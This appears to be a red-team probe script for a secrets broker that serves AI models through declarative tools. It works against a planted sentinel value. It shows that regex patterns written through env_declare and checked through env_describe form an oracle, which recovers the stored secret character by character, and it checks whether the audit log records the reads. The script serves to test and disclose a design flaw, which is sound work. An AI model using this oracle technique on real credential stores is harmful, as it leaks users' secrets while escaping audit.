// W2 · Attack: extract a stored secret using only declarative tools.
//
// Claim under attack: "The model manipulates declarations, never values.
// If the model's only verbs are 'declare that this project needs X' and
// 'ensure X exists', then no sequence of model actions can produce a value
// in the transcript. Safety is structural, not policed." (PLAN §3.1)
//
// `env_declare` lets the model write an arbitrary `format.pattern`.
// `env_describe` evaluates that pattern against the LIVE STORED VALUE and
// returns `formatValid: boolean` to the model (broker.ts:105-110).
// That is a chosen-predicate oracle over the secret. Neither tool prompts
// the user, neither is rate limited, and neither is audited.
//
// This probe recovers the whole value one character at a time through the
// public SDK dispatch surface — the same surface MCP and HTTP sit on.
import { mkdtempSync, writeFileSync, rmSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createBroker, dispatch } from '../packages/sdk/dist/index.js';

const SENTINEL = 'sk-W2SENTINEL-oracle-9c3f1a7b0e5d';

const root = mkdtempSync(join(tmpdir(), 'envseal-w2-oracle-'));
writeFileSync(join(root, '.gitignore'), '.env\n', 'utf8');
// The value is provisioned exactly as the broker would leave it: in the
// dotenv sink, never through the model channel.
writeFileSync(join(root, '.env'), `SECRET_KEY=${SENTINEL}\n`, 'utf8');

const broker = createBroker({ root });
let calls = 0;
const call = async (name, args) => {
  calls++;
  return dispatch(broker, name, args);
};

// Everything below uses ONLY env_declare + env_describe.
await call('env_declare', {
  entries: [{ key: 'SECRET_KEY', description: 'probe', required: true, secret: true }],
});

/** Ask the oracle: does the stored value match this regex? */
async function matches(pattern) {
  await call('env_declare', {
    entries: [
      { key: 'SECRET_KEY', description: 'probe', required: true, secret: true, format: { pattern } },
    ],
  });
  const status = await call('env_describe', {});
  return status.entries.find((e) => e.key === 'SECRET_KEY').formatValid;
}

const esc = (s) => s.replace(/[.*+?^${}()|[\]\\-]/g, '\\$&');

console.log('--- oracle liveness ---');
console.log(`  present:                 ${(await call('env_describe', {})).entries[0].present}`);
console.log(`  matches ^sk-  :          ${await matches('^sk-')}`);
console.log(`  matches ^zz-  :          ${await matches('^zz-')}`);

// 1. Length, by binary search on ^.{n}$
console.log('--- recovering length ---');
let lo = 0;
let hi = 256;
while (lo < hi) {
  const mid = Math.floor((lo + hi) / 2);
  if (await matches(`^.{0,${mid}}$`)) hi = mid;
  else lo = mid + 1;
}
console.log(`  recovered length:        ${lo}  (actual ${SENTINEL.length})`);

// 2. Characters, by binary search over the alphabet at each position.
const ALPHABET = [...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.'];
let recovered = '';
for (let i = 0; i < lo; i++) {
  let candidates = ALPHABET;
  while (candidates.length > 1) {
    const half = candidates.slice(0, Math.ceil(candidates.length / 2));
    const cls = `[${half.map(esc).join('')}]`;
    if (await matches(`^${esc(recovered)}${cls}`)) candidates = half;
    else candidates = candidates.slice(Math.ceil(candidates.length / 2));
  }
  recovered += candidates[0];
}

console.log('--- result ---');
console.log(`  sentinel:   ${SENTINEL}`);
console.log(`  recovered:  ${recovered}`);
console.log(`  EXACT MATCH: ${recovered === SENTINEL}`);
console.log(`  tool calls used: ${calls}  (env_declare + env_describe only)`);

// Did any of it show up where an auditor would look?
const audit = (() => {
  try {
    return readFileSync(join(root, '.envseal', 'audit.jsonl'), 'utf8');
  } catch {
    return '';
  }
})();
console.log(`  audit.jsonl lines:       ${audit.split('\n').filter(Boolean).length}`);
console.log(`  audit mentions the read: ${/describe|oracle|pattern/i.test(audit)}`);

broker.dispose();
rmSync(root, { recursive: true, force: true });
